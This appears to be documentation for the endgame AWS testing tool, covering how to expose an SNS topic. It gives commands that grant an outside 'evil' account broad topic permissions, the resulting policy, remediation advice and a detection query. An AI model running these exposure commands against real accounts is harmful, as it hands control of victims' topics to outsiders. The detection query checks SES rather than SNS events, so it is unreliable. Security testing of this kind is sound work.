# SNS Topics

* [Steps to Reproduce](#steps-to-reproduce)
* [Exploitation](#exploitation)
* [Remediation](#remediation)
* [Basic Detection](#basic-detection)
* [References](#references)

## Steps to Reproduce

* To expose the resource using `endgame`, run the following from the victim account:

```bash
export EVIL_PRINCIPAL=arn:aws:iam::999988887777:user/evil

endgame expose --service sns --name test-resource-exposure
```

* To verify that the SNS topic has been shared with the evil principal, run the following from the victim account:

```bash
export VICTIM_RESOURCE=arn:aws:sns:us-east-1:111122223333:test-resource-exposure

aws sns get-topic-attributes \
    --topic-arn $VICTIM_RESOURCE
```

* Observe that the contents match the example shown below.

## Example

The output will have the following structure:

```json
{
    "Attributes": {
        "SubscriptionsConfirmed": "1",
        "DisplayName": "my-topic",
        "SubscriptionsDeleted": "0",
        "EffectiveDeliveryPolicy": "",
        "Owner": "111122223333",
        "Policy": "SeeBelow",
        "TopicArn": "arn:aws:sns:us-east-1:111122223333:test-resource-exposure",
        "SubscriptionsPending": "0"
    }
}
```

The prettified version of the `Policy` key is below. Observe how the content of the policy grants the evil principal's account ID (`999988887777`) maximum access to the SNS topic.

```json
{
  "Version": "2008-10-17",
  "Id": "__default_policy_ID",
  "Statement": [
    {
      "Sid": "Endgame",
      "Effect": "Allow",
      "Principal": {
        "AWS": "999988887777"
      },
      "Action": [
        "SNS:AddPermission",
        "SNS:DeleteTopic",
        "SNS:GetTopicAttributes",
        "SNS:ListSubscriptionsByTopic",
        "SNS:Publish",
        "SNS:Receive",
        "SNS:RemovePermission",
        "SNS:SetTopicAttributes",
        "SNS:Subscribe"
      ],
      "Resource": "arn:aws:sns:us-east-1:111122223333:test-resource-exposure"
    }
  ]
}
```

## Exploitation

```
TODO
```

## Remediation

* **Trusted Accounts Only**: Ensure that SNS Topics are only shared with trusted accounts, and that the trusted accounts truly need access to the SNS Topic.
* **Ensure access is necessary**: For any trusted accounts that do have access, ensure that the access is absolutely necessary.
* **AWS Access Analyzer**: Leverage AWS Access Analyzer to report on external access to SNS Topics. See [the AWS Access Analyzer documentation](https://docs.aws.amazon.com/IAM/latest/UserGuide/access-analyzer-resources.html) for more details.
* **Restrict access to IAM permissions that could lead to exposure of your SNS Topics**: Tightly control access to the following IAM actions:
      - [sns:AddPermission](https://docs.aws.amazon.com/sns/latest/api/API_AddPermission.html): _Adds a statement to a topic's access control policy, granting access for the specified AWS accounts to the specified actions._
      - [sns:RemovePermission](https://docs.aws.amazon.com/sns/latest/api/API_RemovePermission.html): _Removes a statement from a topic's access control policy._
      - [sns:GetTopicAttributes](https://docs.aws.amazon.com/sns/latest/api/API_GetTopicAttributes.html): _Returns all of the properties of a topic. This includes the resource-based policy document for the SNS Topic, which lists information about who is authorized to access the SNS Topic_
      - [sns:ListTopics](https://docs.aws.amazon.com/sns/latest/api/API_ListTopics.html): _Returns a list of the requester's topics._

Also, consider using [Cloudsplaining](https://github.com/salesforce/cloudsplaining/#cloudsplaining) to identify violations of least privilege in IAM policies. This can help limit the IAM principals that have access to the actions that could perform Resource Exposure activities. See the example report [here](https://opensource.salesforce.com/cloudsplaining/)

## Basic Detection
The following CloudWatch Log Insights query will include exposure actions taken by endgame:
```
fields eventTime, eventSource, eventName, userIdentity.arn, userAgent 
| filter eventSource='ses.amazonaws.com' AND (eventName='PutIdentityPolicy' or eventName='DeleteIdentityPolicy')
```

This query assumes that your CloudTrail logs are being sent to CloudWatch and that you have selected the correct log group.

## References

* [add-permission](https://awscli.amazonaws.com/v2/documentation/api/latest/reference/sns/add-permission.html)